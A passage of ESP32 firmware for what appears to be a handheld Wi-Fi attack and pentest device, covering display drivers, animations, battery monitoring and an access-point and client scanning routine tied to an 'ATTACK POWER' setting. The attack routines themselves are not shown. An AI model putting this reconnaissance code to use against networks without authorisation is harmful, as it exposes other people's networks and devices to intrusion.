static void drawCenteredFB(int y, const String &s, uint16_t color, uint8_t scale, uint16_t *fbp) {
  uint8_t actualScale=scale;
  while(actualScale>1 && textWidth(s,actualScale)>TFT_W-12) actualScale--;
  int w=textWidth(s,actualScale);
  drawTextFB(max(4,(TFT_W-w)/2), y, s, color, actualScale, fbp);
}

static void drawTextCenteredInRect(int x,int y,int w,int h,const String &text,uint16_t color,uint8_t scale,uint16_t *fbp){
  uint8_t sc=scale;
  while(sc>1 && textWidth(text,sc)>w-8) sc--;
  int tw=textWidth(text,sc);
  int th=12*sc;
  int tx=x+(w-tw)/2;
  int ty=y+(h-th)/2;
  drawTextFB(tx,ty,text,color,sc,fbp,max(1,(w-4)/(8*sc)));
}

static void drawLineFB(int x0,int y0,int x1,int y1,uint16_t color,uint16_t *fbp){
  int dx=abs(x1-x0), sx=x0<x1?1:-1, dy=-abs(y1-y0), sy=y0<y1?1:-1, err=dx+dy;
  for(;;){putPixel(x0,y0,color,fbp);if(x0==x1&&y0==y1)break;int e2=2*err;if(e2>=dy){err+=dy;x0+=sx;}if(e2<=dx){err+=dx;y0+=sy;}}
}
static void drawCircleFB(int cx,int cy,int radius,uint16_t color,uint16_t *fbp){
  int x=radius,y=0,err=1-radius;
  while(x>=y){putPixel(cx+x,cy+y,color,fbp);putPixel(cx+y,cy+x,color,fbp);putPixel(cx-y,cy+x,color,fbp);putPixel(cx-x,cy+y,color,fbp);putPixel(cx-x,cy-y,color,fbp);putPixel(cx-y,cy-x,color,fbp);putPixel(cx+y,cy-x,color,fbp);putPixel(cx+x,cy-y,color,fbp);y++;if(err<0)err+=2*y+1;else{x--;err+=2*(y-x)+1;}}
}
static void fillCircleFB(int cx,int cy,int radius,uint16_t color,uint16_t *fbp){
  if(radius<=0)return;
  const int rr=radius*radius;
  for(int dy=-radius;dy<=radius;dy++){
    int xx=(int)sqrtf((float)(rr-dy*dy));
    fillRectFB(cx-xx,cy+dy,xx*2+1,1,color,fbp);
  }
}
static void fillRoundRectFB(int x,int y,int w,int h,int radius,uint16_t color,uint16_t *fbp){
  if(!fbp||w<=0||h<=0)return;
  int r=max(0,min(radius,min(w,h)/2));
  if(r==0){fillRectFB(x,y,w,h,color,fbp);return;}
  fillRectFB(x+r,y,w-2*r,h,color,fbp);
  fillRectFB(x,y+r,r,h-2*r,color,fbp);
  fillRectFB(x+w-r,y+r,r,h-2*r,color,fbp);
  fillCircleFB(x+r,y+r,r,color,fbp);
  fillCircleFB(x+w-r-1,y+r,r,color,fbp);
  fillCircleFB(x+r,y+h-r-1,r,color,fbp);
  fillCircleFB(x+w-r-1,y+h-r-1,r,color,fbp);
}
static void roundedCardFB(int x,int y,int w,int h,int radius,uint16_t border,uint16_t fill,uint16_t *fbp){
  fillRoundRectFB(x,y,w,h,radius,border,fbp);
  if(w>3&&h>3)fillRoundRectFB(x+1,y+1,w-2,h-2,max(1,radius-1),fill,fbp);
}
static void drawPillFB(int x,int y,int w,int h,uint16_t fill,uint16_t border,uint16_t *fbp){
  roundedCardFB(x,y,w,h,h/2,border,fill,fbp);
}


// ----------------------------- LCD ----------------------------------
static SPIClass lcdSPI(FSPI);
static SPISettings lcdSettings(60000000, MSBFIRST, SPI_MODE0);
static uint16_t *fb = nullptr;
static bool fbOK = false;
static bool rot180 = false;

// Lightweight home animation state. It is rendered into a small region only,
// leaving the rest of the interface static to avoid full-frame redraw lag.
static uint32_t homeAnimEpochMs = 0;
static uint32_t homeAnimLastFrameMs = 0;
static constexpr int HOME_SKULL_X = 24;
static constexpr int HOME_SKULL_Y = 65;
static constexpr int HOME_SKULL_W = 272;
static constexpr int HOME_SKULL_H = 162;
static constexpr int INTRO_SKULL_X = 18;
static constexpr int INTRO_SKULL_Y = 64;
static constexpr int INTRO_SKULL_W = 284;
static constexpr int INTRO_SKULL_H = 288;
static uint32_t introStartMs=0;
static uint32_t introLastFrameMs=0;
static bool introTouchHeld=false;

static uint16_t gray565(uint8_t g){
  return (uint16_t)(((g&0xF8u)<<8)|((g&0xFCu)<<3)|(g>>3));
}

static void drawSkullSpriteScaled(uint8_t frame,int x,int y,int w,int h,uint16_t *target){
  if(!target || w<=0 || h<=0)return;
  frame&=3;
  for(int dy=0;dy<h;dy++){
    int sy=(dy*NOVAX_SKULL_H)/h;
    for(int dx=0;dx<w;dx++){
      int sx=(dx*NOVAX_SKULL_W)/w;
      uint8_t shade=pgm_read_byte(&NOVAX_SKULL_FRAMES[frame][sy*NOVAX_SKULL_W+sx]);
      // Black ink is the same as the dark theme background, so zero pixels
      // remain transparent and the paper-white/grey crosshatching is retained.
      if(shade<15)continue;
      putPixel(x+dx,y+dy,gray565(shade),target);
    }
  }
}

static uint8_t homeMouthFrame(uint32_t elapsed){
  uint32_t t=elapsed%1500UL;
  if(t<240)return 0;      // closed
  if(t<430)return 1;      // opening
  if(t<680)return 2;      // open
  if(t<880)return 3;      // closing
  if(t<1050)return 1;
  return 0;
}

static void drawHomeSkull(uint32_t elapsed){
  for(int y=HOME_SKULL_Y;y<HOME_SKULL_Y+HOME_SKULL_H;y++){
    uint16_t bg=BLACK;
    if(y<76)bg=mix565(BLACK,CYAN,(uint8_t)((76-y)*10/76));
    fillRectFB(HOME_SKULL_X,y,HOME_SKULL_W,1,bg,fb);
  }
  const int cx=160,cy=146;
  int ring=(int)((elapsed/150)%8);
  uint16_t ringSoft=mix565(BLACK,CYAN,35);
  uint16_t ringHot=mix565(BLACK,CYAN,90);
  drawCircleFB(cx,cy,57,DGRAY,fb);
  drawCircleFB(cx,cy,66,ring==1||ring==5?ringHot:ringSoft,fb);
  drawCircleFB(cx,cy,75,ring==3||ring==7?ringHot:DGRAY,fb);
  drawLineFB(cx-88,cy,cx-77,cy,CYAN,fb);drawLineFB(cx+77,cy,cx+88,cy,CYAN,fb);
  drawLineFB(cx,cy-86,cx,cy-76,DGRAY,fb);drawLineFB(cx,cy+76,cx,cy+82,DGRAY,fb);
  float z=(1.0f-cosf((float)(elapsed%2600UL)*6.2831853f/2600.0f))*0.5f;
  int sw=122+(int)(22.0f*z), sh=135+(int)(22.0f*z);
  int sx=cx-sw/2, sy=cy-sh/2+(int)(sinf((float)elapsed*0.0026f)*2.0f);
  drawSkullSpriteScaled(homeMouthFrame(elapsed),sx,sy,sw,sh,fb);
}



static void lcdCommand(uint8_t cmd) {
  lcdSPI.beginTransaction(lcdSettings);
  digitalWrite(LCD_CS, LOW); digitalWrite(LCD_DC, LOW);
  lcdSPI.transfer(cmd);
  digitalWrite(LCD_CS, HIGH); lcdSPI.endTransaction();
}

static void lcdCommandData(uint8_t cmd, const uint8_t *data, size_t len) {
  lcdSPI.beginTransaction(lcdSettings);
  digitalWrite(LCD_CS, LOW); digitalWrite(LCD_DC, LOW);
  lcdSPI.transfer(cmd); digitalWrite(LCD_DC, HIGH);
  if (len) lcdSPI.writeBytes(data, len);
  digitalWrite(LCD_CS, HIGH); lcdSPI.endTransaction();
}

static void lcdSetAddressWindow(uint16_t x0, uint16_t y0, uint16_t x1, uint16_t y1) {
  uint8_t b[4];
  b[0]=x0>>8; b[1]=x0; b[2]=x1>>8; b[3]=x1; lcdCommandData(0x2A,b,4);
  b[0]=y0>>8; b[1]=y0; b[2]=y1>>8; b[3]=y1; lcdCommandData(0x2B,b,4);
  lcdCommand(0x2C);
}

static void lcdPush(const uint16_t *src) {
  if (!src) return;
  lcdSetAddressWindow(0,0,TFT_W-1,TFT_H-1);
  uint8_t out[1024];
  const size_t total = (size_t)TFT_W * TFT_H;
  lcdSPI.beginTransaction(lcdSettings);
  digitalWrite(LCD_CS, LOW); digitalWrite(LCD_DC, HIGH);
  // Keep MADCTL fixed. For 180 degrees, reverse the complete row-major frame;
  // that rotates every pixel, including text, icons and animations.
  for (size_t sent=0; sent<total;) {
    size_t n=min<size_t>(512,total-sent);
    for (size_t i=0;i<n;i++) {
      size_t logicalIndex = rot180 ? (total - 1 - (sent+i)) : (sent+i);
      uint16_t v=src[logicalIndex];
      out[i*2]=(uint8_t)(v>>8); out[i*2+1]=(uint8_t)v;
    }
    lcdSPI.writeBytes(out,n*2); sent+=n;
  }
  digitalWrite(LCD_CS,HIGH); lcdSPI.endTransaction();
}


// Push just one framebuffer rectangle. Home skull animation uses this path so
// only ~34 KB are transmitted per frame instead of the full 307 KB screen.
static void lcdPushRect(const uint16_t *src,int x,int y,int w,int h) {
  if(!src || w<=0 || h<=0) return;
  int x0=max(0,x), y0=max(0,y), x1=min(TFT_W,x+w), y1=min(TFT_H,y+h);
  if(x0>=x1 || y0>=y1) return;
  // This renderer is called with in-bounds regions, but clipping is retained.
  int rw=x1-x0, rh=y1-y0;
  int px0=rot180 ? TFT_W-x1 : x0;
  int py0=rot180 ? TFT_H-y1 : y0;
  lcdSetAddressWindow((uint16_t)px0,(uint16_t)py0,
                      (uint16_t)(px0+rw-1),(uint16_t)(py0+rh-1));
  uint8_t out[TFT_W*2];
  lcdSPI.beginTransaction(lcdSettings);
  digitalWrite(LCD_CS,LOW); digitalWrite(LCD_DC,HIGH);
  for(int row=0;row<rh;row++){
    for(int col=0;col<rw;col++){
      int sx=rot180 ? (x1-1-col) : (x0+col);
      int sy=rot180 ? (y1-1-row) : (y0+row);
      uint16_t v=src[(size_t)sy*TFT_W+sx];
      out[col*2]=(uint8_t)(v>>8);
      out[col*2+1]=(uint8_t)v;
    }
    lcdSPI.writeBytes(out,(size_t)rw*2);
  }
  digitalWrite(LCD_CS,HIGH); lcdSPI.endTransaction();
}

// Smoothly scales the running Salarini mascot. Zero RGB565 entries are transparent
// on the pure-black intro canvas. Only the intro uses this large sprite path.
static void drawSalariniSpriteScaled(uint8_t frame,int x,int y,int w,int h){
  if(!fb||w<=0||h<=0)return;
  frame%=SALARINI_MASCOT_FRAME_COUNT;
  const int x0=max(0,x),y0=max(0,y),x1=min(TFT_W,x+w),y1=min(TFT_H,y+h);
  if(x0>=x1||y0>=y1)return;
  for(int yy=y0;yy<y1;++yy){
    int sy=(int)(((int64_t)(yy-y)*SALARINI_MASCOT_H)/h);
    if(sy<0)sy=0;if(sy>=SALARINI_MASCOT_H)sy=SALARINI_MASCOT_H-1;
    for(int xx=x0;xx<x1;++xx){
      int sx=(int)(((int64_t)(xx-x)*SALARINI_MASCOT_W)/w);
      if(sx<0)sx=0;if(sx>=SALARINI_MASCOT_W)sx=SALARINI_MASCOT_W-1;
      uint16_t c=pgm_read_word(&SALARINI_MASCOT_FRAMES[frame][(size_t)sy*SALARINI_MASCOT_W+sx]);
      if(c)putPixel(xx,yy,c,fb);
    }
  }
}

static void lcdSetRotation(bool /*r*/) {
  // The physical controller is kept in the board's native orientation.
  // 180-degree rotation is performed in lcdPush(), so the complete rendered
  // framebuffer rotates together (including all text).
  const uint8_t mad=0x48;
  lcdCommandData(0x36,&mad,1);
}

static bool chWrite(uint8_t reg, uint8_t val) {
  Wire.beginTransmission(CH32_ADDR); Wire.write(reg); Wire.write(val);
  return Wire.endTransmission()==0;
}

static uint8_t chOut = 0;
static bool chInit() {
  Wire.beginTransmission(CH32_ADDR);
  if (Wire.endTransmission()!=0) return false;
  if (!chWrite(CH32_MODE,0xFF)) return false;
  if (!chWrite(CH32_OUT,0x00)) return false;
  if (!chWrite(CH32_PWM,0x00)) return false;
  const uint8_t outputs = (1u<<EXIO_TP_RST)|(1u<<EXIO_LCD_RST)|(1u<<EXIO_POWER);
  if (!chWrite(CH32_MODE,outputs)) return false;

  chOut=(1u<<EXIO_TP_RST)|(1u<<EXIO_LCD_RST);
  if (!chWrite(CH32_OUT,chOut)) return false;
  delay(50);
  chOut=0; if (!chWrite(CH32_OUT,chOut)) return false; delay(50);
  chOut=outputs; return chWrite(CH32_OUT,chOut);
}

static bool chSet(uint8_t bit,bool high) {
  if (high) chOut |= (1u<<bit); else chOut &= ~(1u<<bit);
  return chWrite(CH32_OUT,chOut);
}

static bool boardBacklight(uint8_t percent) {
  if (percent>100) percent=100;
  uint8_t duty=(uint8_t)((percent*255UL+50UL)/100UL);
  return chWrite(CH32_PWM,duty);
}

static void lcdInit() {
  pinMode(LCD_CS,OUTPUT); pinMode(LCD_DC,OUTPUT); digitalWrite(LCD_CS,HIGH);
  lcdSPI.begin(LCD_SCK,LCD_MISO,LCD_MOSI,LCD_CS);
  lcdCommand(0x01); delay(20); lcdCommand(0x11); delay(100);
  const uint8_t mad=0x48,col=0x55;
  lcdCommandData(0x36,&mad,1); lcdCommandData(0x3A,&col,1);
  const uint8_t f0c3[]={0xC3}; lcdCommandData(0xF0,f0c3,1);
  const uint8_t f096[]={0x96}; lcdCommandData(0xF0,f096,1);
  const uint8_t b4[]={0x01}; lcdCommandData(0xB4,b4,1);
  const uint8_t b7[]={0xC6}; lcdCommandData(0xB7,b7,1);
  const uint8_t e8[]={0x40,0x8A,0x00,0x00,0x29,0x19,0xA5,0x33}; lcdCommandData(0xE8,e8,8);
  const uint8_t c1[]={0x06}; lcdCommandData(0xC1,c1,1);
  const uint8_t c2[]={0xA7}; lcdCommandData(0xC2,c2,1);
  const uint8_t c5[]={0x18}; lcdCommandData(0xC5,c5,1);
  const uint8_t e0[]={0xF0,0x09,0x0B,0x06,0x04,0x15,0x2F,0x54,0x42,0x3C,0x17,0x14,0x18,0x1B}; lcdCommandData(0xE0,e0,14);
  const uint8_t e1[]={0xF0,0x09,0x0B,0x06,0x04,0x03,0x2D,0x43,0x42,0x3B,0x16,0x14,0x17,0x1B}; lcdCommandData(0xE1,e1,14);
  const uint8_t f03c[]={0x3C}; lcdCommandData(0xF0,f03c,1);
  const uint8_t f069[]={0x69}; lcdCommandData(0xF0,f069,1);
  lcdCommand(0x21); lcdCommand(0x29); delay(120);
  size_t bytes=(size_t)TFT_W*TFT_H*2;
  fb=(uint16_t*)heap_caps_malloc(bytes,MALLOC_CAP_SPIRAM|MALLOC_CAP_8BIT);
  fbOK=(fb!=nullptr);
  if (!fbOK) return;
  std::fill(fb,fb+(size_t)TFT_W*TFT_H,BLACK); lcdPush(fb);
}

// ----------------------------- Touch --------------------------------
static bool touchRead(uint16_t &x,uint16_t &y) {
  Wire.beginTransmission(FT6336_ADDR); Wire.write(0x02);
  if (Wire.endTransmission(false)!=0) return false;
  if (Wire.requestFrom(FT6336_ADDR,(uint8_t)5)!=5) return false;
  uint8_t points=Wire.read()&0x0F;
  uint8_t xh=Wire.read(),xl=Wire.read(),yh=Wire.read(),yl=Wire.read();
  if (!points) return false;
  int rx=((xh&0x0F)<<8)|xl, ry=((yh&0x0F)<<8)|yl;
  if (rx<0 || ry<0 || rx>=TFT_W || ry>=TFT_H) return false;
  if (rot180) { rx=TFT_W-1-rx; ry=TFT_H-1-ry; }
  x=(uint16_t)rx; y=(uint16_t)ry; return true;
}

// ----------------------------- PMU ----------------------------------
// Direct AXP2101 register access. This avoids XPowersLib version conflicts in Arduino IDE.
static bool pmuOK=false;
static bool batPresent=false;
static bool batCharging=false;
static bool batDischarging=false;
static bool vbusPresent=false;
static int batGaugePercent=-1;
static int batPercent=-1;
static const char *batPercentSource="--";
static uint16_t batMv=0, vbusMv=0, sysMv=0;
static uint8_t axpStatus1=0, axpStatus2=0;
static std::array<int16_t,5> pctHistory{{-1,-1,-1,-1,-1}};
static uint8_t pctCursor=0;

static bool axpRead8(uint8_t reg,uint8_t &v){
  Wire.beginTransmission(AXP2101_ADDR); Wire.write(reg);
  if(Wire.endTransmission(false)!=0) return false;
  if(Wire.requestFrom(AXP2101_ADDR,(uint8_t)1)!=1) return false;
  v=Wire.read(); return true;
}
static bool axpReadN(uint8_t reg,uint8_t *buf,size_t n){
  Wire.beginTransmission(AXP2101_ADDR); Wire.write(reg);
  if(Wire.endTransmission(false)!=0) return false;
  if(Wire.requestFrom(AXP2101_ADDR,(uint8_t)n)!=n) return false;
  for(size_t i=0;i<n;i++) buf[i]=Wire.read();
  return true;
}
static bool axpWrite8(uint8_t reg,uint8_t v){
  Wire.beginTransmission(AXP2101_ADDR); Wire.write(reg); Wire.write(v);
  return Wire.endTransmission()==0;
}
static bool axpUpdate8(uint8_t reg,uint8_t clearMask,uint8_t setMask){
  uint8_t v=0; if(!axpRead8(reg,v)) return false;
  v=(uint8_t)((v & (uint8_t)~clearMask) | setMask);
  return axpWrite8(reg,v);
}
static uint16_t axpH6L8(uint8_t hi,uint8_t lo){
  uint8_t b[2]; if(!axpReadN(hi,b,2)) return 0; return (uint16_t)(((b[0]&0x3F)<<8)|b[1]);
}
static uint16_t axpH5L8(uint8_t hi,uint8_t lo){
  uint8_t b[2]; if(!axpReadN(hi,b,2)) return 0; return (uint16_t)(((b[0]&0x1F)<<8)|b[1]);
}

static int percentFromVoltage(uint16_t mv){
  struct P{uint16_t mv;uint8_t pct;};
  static const P curve[]={{3300,0},{3450,3},{3550,8},{3650,18},{3750,30},{3850,45},{3950,60},{4050,75},{4150,90},{4200,100}};
  if(mv<curve[0].mv) return 0;
  if(mv>=curve[9].mv) return 100;
  for(size_t i=1;i<10;i++) if(mv<=curve[i].mv){
    int dv=(int)curve[i].mv-(int)curve[i-1].mv; int dp=(int)curve[i].pct-(int)curve[i-1].pct;
    return curve[i-1].pct+((int)mv-(int)curve[i-1].mv)*dp/dv;
  }
  return 0;
}
static bool validGaugePercent(int raw){ return raw>=0 && raw<=100; }

static const char* chargerStatusText(){
  switch(axpStatus2&0x07){case 0:return "TRI";case 1:return "PRE";case 2:return "CC";case 3:return "CV";case 4:return "DONE";default:return "STOP";}
}
static void pmuInit(){
  uint8_t id=0;
  if(!axpRead8(0x03,id) || id!=0x4A){pmuOK=false;Serial.printf("[AXP2101] FAIL id=0x%02X\n",id);return;}
  pmuOK=true;
  // Official board configuration: TS measurement disabled, battery/VBUS/system/temperature ADC on.
  axpUpdate8(0x30,0x02,0x1D); // bit1 TS off; bits 0,2,3,4 on
  axpUpdate8(0x68,0x00,0x01); // battery detection enable
  axpUpdate8(0x61,0xFC,0x02); // 50 mA pre-charge
  axpUpdate8(0x62,0xE0,0x0A); // 400 mA constant-current charge
  axpUpdate8(0x63,0xF0,0x01); // 25 mA termination current
  axpUpdate8(0x64,0xF8,0x03); // 4.20 V charge target
  Serial.println("[AXP2101] OK @ 0x34");
}
static void pmuUpdate(){
  if(!pmuOK)return;
  uint8_t st1=0,st2=0;
  if(!axpRead8(0x00,st1)||!axpRead8(0x01,st2))return;
  axpStatus1=st1; axpStatus2=st2;

  // AXP2101 ADC mapping used by XPowersLib: VBAT 0x34/0x35 (1 mV/LSB),
  // VBUS 0x38/0x39, VSYS 0x3A/0x3B.
  batMv=axpH5L8(0x34,0x35);
  vbusMv=axpH6L8(0x38,0x39);
  sysMv=axpH6L8(0x3A,0x3B);

  batPresent=(st1&(1u<<3))!=0;
  vbusPresent=((st1&(1u<<5))!=0) && ((st2&(1u<<3))==0);
  const uint8_t chgState=(st2>>5)&0x03;
  batCharging=(chgState==1);
  batDischarging=(chgState==2);

  // 0xA4 is the AXP2101 fuel-gauge percentage. Prefer it whenever the PMU
  // reports a battery. Do not median-filter it: that made the UI lag behind
  // the PMU and made the displayed percentage look inaccurate.
  uint8_t raw8=0;
  batGaugePercent=-1;
  if(batPresent && axpRead8(0xA4,raw8) && validGaugePercent(raw8))
    batGaugePercent=(int)raw8;

  if(validGaugePercent(batGaugePercent)) {
    batPercent=batGaugePercent;
    batPercentSource="GAUGE";
  } else if(batPresent && batMv>=3000) {
    batPercent=percentFromVoltage(batMv);
    batPercentSource="VOLT";
  } else {
    batPercent=-1;
    batPercentSource="--";
  }
  if(!batPresent && batMv<3000){
    batGaugePercent=-1;
    batPercent=-1;
    batPercentSource="--";
  }
}

// ----------------------------- Wi-Fi --------------------------------

static bool validScanChannel(int ch){
  if(ch>=1 && ch<=13) return true;
  // 5 GHz primary channels used by the ESP32-C5 on this board.
  static const uint8_t ch5[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165,169,173,177};
  for(uint8_t c:ch5) if(ch==c) return true;
  return false;
}
static const char* bandForChannel(int ch){
  if(ch>=1 && ch<=13) return "2.4G";
  if(ch>=32 && ch<=177 && validScanChannel(ch)) return "5G";
  return "5G";
}

static char translitUtf8(uint8_t a,uint8_t b,uint8_t c,uint8_t &used){
  used=1;
  if(a==0xC3){used=2;switch(b){
    case 0x80:case 0x81:case 0x82:case 0x83:case 0x84:case 0x85:case 0x86:return 'A';case 0x87:return 'C';
    case 0x88:case 0x89:case 0x8A:case 0x8B:return 'E';case 0x8C:case 0x8D:case 0x8E:case 0x8F:return 'I';
    case 0x91:return 'N';case 0x92:case 0x93:case 0x94:case 0x95:case 0x96:case 0x97:case 0x98:return 'O';
    case 0x99:case 0x9A:case 0x9B:case 0x9C:return 'U';case 0x9D:return 'Y';case 0x9E:return 'T';case 0x9F:return 's';
    case 0xA0:case 0xA1:case 0xA2:case 0xA3:case 0xA4:case 0xA5:case 0xA6:return 'a';case 0xA7:return 'c';
    case 0xA8:case 0xA9:case 0xAA:case 0xAB:return 'e';case 0xAC:case 0xAD:case 0xAE:case 0xAF:return 'i';
    case 0xB1:return 'n';case 0xB2:case 0xB3:case 0xB4:case 0xB5:case 0xB6:case 0xB8:return 'o';
    case 0xB9:case 0xBA:case 0xBB:case 0xBC:return 'u';case 0xBD:return 'y';case 0xBE:return 't';case 0xBF:return 'y';
  }}
  if(a==0xC2){used=2;switch(b){case 0xA1:return '!';case 0xBF:return '?';case 0xB0:return 'o';case 0xA9:return 'c';}}
  // Cyrillic subset (common SSID cases) -> Latin.
  if(a==0xD0&&b>=0x90&&b<=0xAF){used=2;static const char map[]="ABVGDEZIKLMNOPRSTUFHCCHSHSCHY";int i=b-0x90;return map[i<28?i:0];}
  if(a==0xD0&&b>=0xB0&&b<=0xBF){used=2;static const char map[]="abvgdezijklmnop";int i=b-0xB0;return map[i<16?i:0];}
  if(a==0xD1&&b>=0x80&&b<=0x8F){used=2;static const char map[]="rstuc?";int i=b-0x80;return map[i<6?i:0];}
  (void)c;return '?';
}

static String sanitizeSSID(const String &src,size_t maxChars=32){
  if(src.length()==0)return "<HIDDEN>";
  String out;out.reserve(maxChars);size_t i=0;
  while(i<src.length() && out.length()<maxChars){
    uint8_t b=(uint8_t)src[i];
    if(b>=32&&b<=126){out+=(char)b;i++;continue;}
    uint8_t used=1;char t='?';
    if(b<0x80){t='?';}
    else if(b<0xE0&&i+1<src.length())t=translitUtf8(b,(uint8_t)src[i+1],0,used);
    else if(b<0xF0&&i+2<src.length())t=translitUtf8(b,(uint8_t)src[i+1],(uint8_t)src[i+2],used);
    out+=t;i+=used;
  }
  return out;
}

static bool apIsSame(const APInfo &a,const String &bssid) { return a.bssid==bssid; }

static void sortAPs() {
  // V22: closest networks FIRST - the list is ordered by signal strength, so
  // the APs you are nearest to are always at the top and the weakest echo
  // down at the bottom (user request).
  std::sort(aps,aps+apCount,[](const APInfo&a,const APInfo&b){
    if(a.rssi!=b.rssi) return a.rssi>b.rssi;
    return strcmp(a.ssid.c_str(),b.ssid.c_str())<0;
  });
}

// ---- V22: scan depth follows ATTACK POWER (Settings > ATTACK POWER) -----
// LOW  = FAST sweep  : short per-channel dwell, finds every strong/near AP.
// MED  = BALANCED    : ESP-IDF default active dwell - full efficiency,
//                      ~30% faster than the old fixed 180 ms.
// MAX  = DEEP sweep  : long dwell PLUS a passive second pass that hears APs
//                      which never answer probes (hidden SSIDs, quiet far
//                      APs, DFS-channel beacons).
static uint32_t scanActiveDwellMs(){
  switch(ae::powerLevel()){
    case ae::Power::PWR_LOW: return 90;
    case ae::Power::PWR_MAX: return 240;
    default: return 130;
  }
}
static uint32_t scanDeepDwellMs(){
  // Passive listen needs >= 2 typical beacon intervals (~102 ms each) to
  // catch at least one beacon from almost every AP on the channel.
  return 260;
}
static bool scanDeepPass(){ return ae::powerLevel()==ae::Power::PWR_MAX; }
static const char* scanModeName(){
  switch(ae::powerLevel()){
    case ae::Power::PWR_LOW: return "FAST SCAN (PWR LOW)";
    case ae::Power::PWR_MAX: return "DEEP SCAN (PWR HIGH)";
    default: return "BALANCED SCAN (PWR MED)";
  }
}

static uint32_t scanStartMs=0;
static uint32_t scanLastDrawMs=0;
static uint8_t scanAnimPhase=0;
static bool scanThenSelect=false;
static bool scanThenSta=false;
static uint8_t scanPass=0;            // V22: 0 = active pass, 1 = deep passive pass
enum ScanMode : uint8_t { SCAN_MODE_APS, SCAN_MODE_STAS };
static ScanMode scanMode=SCAN_MODE_APS;
static bool visualScanActive=false;
static uint32_t visualScanStartedMs=0;
static uint32_t visualScanLastDrawMs=0;
static uint8_t visualScanPhase=0;
static bool scanBaseDrawn=false;
static ScanMode scanBaseMode=SCAN_MODE_STAS;
static uint8_t scanPassDrawn=0;       // V22: which scan pass the base screen was drawn for

// V22: the caption capsule text changes between the active and the deep
// passive pass, so the base screen must be redrawn when the pass flips.
static const char* scanProgressLabel(){
  if(scanMode==SCAN_MODE_STAS) return "SNIFFING - LEAVE PAGE TO STOP";
  if(scanPass>0) return "DEEP PASS 2/2 - PASSIVE LISTEN";
  if(scanDeepPass()) return "DEEP PASS 1/2 - PROBING";
  return "SIGNAL-SORTED WIFI SCAN";
}

static void drawScanLoading(){
  const bool stations=(scanMode==SCAN_MODE_STAS);
  const bool full=!scanBaseDrawn||scanBaseMode!=scanMode||scanPassDrawn!=scanPass;
  if(full){
    clearFB();header(stations?"STATION SCAN":"ACCESS POINT SCAN");
    roundedCardFB(10,56,300,329,18,DGRAY,surfaceColor(15),fb);
    drawCenteredFB(258,stations?"LOOKING FOR CLIENTS":"DISCOVERING ACCESS POINTS",WHITE,1,fb);
    drawCenteredFB(280,stations?"REAL DATA-FRAME ANALYSIS":"2.4 GHz  +  5 GHz",CYAN,1,fb);
    drawCenteredFB(302,stations?"LINKS CLIENTS TO THEIR APS":scanModeName(),GRAY,1,fb);
    roundedCardFB(30,329,260,20,9,DGRAY,surfaceColor(20),fb);
    drawCenteredFB(358,scanProgressLabel(),GRAY,1,fb);
    footer();
    scanBaseDrawn=true;scanBaseMode=scanMode;scanPassDrawn=scanPass;
  }

  // Only redraw the animated radar/network area and progress capsule. This
  // avoids pushing ~150 KB on every animation frame over SPI.
  const int ax=82,ay=108,aw=156,ah=148;
  fillRectFB(ax,ay,aw,ah,surfaceColor(15),fb);
  const int cx=160,cy=181;
  drawCircleFB(cx,cy,17,DGRAY,fb);
  drawCircleFB(cx,cy,34,mix565(BLACK,CYAN,32),fb);
  drawCircleFB(cx,cy,52,mix565(BLACK,CYAN,26),fb);
  drawLineFB(cx-60,cy,cx+60,cy,DGRAY,fb);
  drawLineFB(cx,cy-60,cx,cy+60,DGRAY,fb);

  if(!stations){
    const float a=(float)(scanAnimPhase%72)*0.08726646f;
    for(int trail=7;trail>=0;--trail){
      float ta=a-(float)trail*0.095f;
      int ex=cx+(int)(cosf(ta)*52.0f),ey=cy+(int)(sinf(ta)*52.0f);
      uint8_t mix=(uint8_t)(55+(7-trail)*4);
      drawLineFB(cx,cy,ex,ey,mix565(BLACK,CYAN,mix),fb);
    }
    const int nodes[6][2]={{cx-27,cy-26},{cx+23,cy-15},{cx+14,cy+32},{cx-35,cy+12},{cx+40,cy+22},{cx-5,cy-44}};
    for(int i=0;i<6;i++){
      int r=3+(((scanAnimPhase+i*2)%8)<3?2:0);
      fillCircleFB(nodes[i][0],nodes[i][1],r,(i&1)?GREEN:YELLOW,fb);
      fillCircleFB(nodes[i][0],nodes[i][1],1,WHITE,fb);
    }
    int satelliteX=cx+(int)(cosf(a)*52.0f),satelliteY=cy+(int)(sinf(a)*52.0f);
    drawCircleFB(satelliteX,satelliteY,5,WHITE,fb);
  }else{
    const int nodes[5][2]={{105,145},{213,143},{108,218},{212,219},{160,133}};
    for(int i=0;i<5;i++){
      int j=(i+1)%5;
      drawLineFB(nodes[i][0],nodes[i][1],nodes[j][0],nodes[j][1],mix565(BLACK,CYAN,28),fb);
    }
    int active=(scanAnimPhase/3)%5;
    for(int i=0;i<5;i++){
      int r=(i==active)?10:6;
      drawCircleFB(nodes[i][0],nodes[i][1],r,(i==active)?CYAN:DGRAY,fb);
      fillCircleFB(nodes[i][0],nodes[i][1],2,(i==active)?WHITE:GREEN,fb);
    }
    int px=91+(scanAnimPhase%28)*5;
    drawLineFB(91,cy+54,px,cy+54,YELLOW,fb);
    fillCircleFB(px,cy+54,3,YELLOW,fb);
  }

  fillRectFB(32,331,256,16,surfaceColor(20),fb);
  roundedCardFB(30,329,260,20,9,DGRAY,surfaceColor(20),fb);
  int phase=(scanAnimPhase*7)%(260-38);
  fillRoundRectFB(32+phase,334,36,10,5,CYAN,fb);
  if(full)lcdPush(fb);
  else { lcdPushRect(fb,ax,ay,aw,ah); lcdPushRect(fb,30,329,260,20); }
}
static void beginScanAPs(){
  if(wifiScanInProgress)return;
  wifiScanInProgress=true;visualScanActive=false;scanMode=SCAN_MODE_APS;scanBaseDrawn=false;
  scanStartMs=millis();scanLastDrawMs=0;scanAnimPhase=0;
  apCount=0;memset(selectedAP,0,sizeof(selectedAP));
  // The scan screen becomes the sole owner of its framebuffer while the
  // asynchronous scan is running. This prevents the normal PMU UI refresh
  // from repainting the menu over the scan animation.
  screen=SCAN_BUSY; menuIndex=0; listTop=0; popup=false;
  WiFi.mode(WIFI_STA);WiFi.disconnect(false,false);delay(30);
  WiFi.scanDelete();
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  scanPass=0;                            // V22: fresh scan always starts with the active pass
  int rc=WiFi.scanNetworks(true,true,false,scanActiveDwellMs());
  Serial.printf("[SCAN] async start rc=%d dwell=%ums mode=%s\n",rc,(unsigned)scanActiveDwellMs(),scanModeName());
  drawScanLoading();
}
static void finishScanAPs(int n,bool mergePass){
